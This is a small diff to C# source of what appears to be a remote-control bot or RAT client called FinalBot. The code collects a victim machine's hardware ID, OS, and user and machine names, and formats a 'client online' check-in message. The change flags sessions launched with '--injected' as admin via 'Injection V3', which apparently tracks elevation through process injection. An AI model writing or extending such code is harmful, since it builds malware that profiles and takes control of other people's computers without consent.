@@ -86,7 +86,8 @@ namespace FinalBot
             string hwid = FinalBot.Modules.SystemInfoModule.GetHWID();
             string osName = FinalBot.Modules.SystemInfoModule.GetFriendlyOSName();
             string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
-            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 Обычный Юзер";
+            bool isInjected = Environment.CommandLine.Contains("--injected");
+            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? (isInjected ? "🔥 АДМИН (Injection V3)" : "🟢 АДМИН") : "🟡 Обычный Юзер";
 
             string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n" +
                           $"━━━━━━━━━━━━━━━━━━\n" +
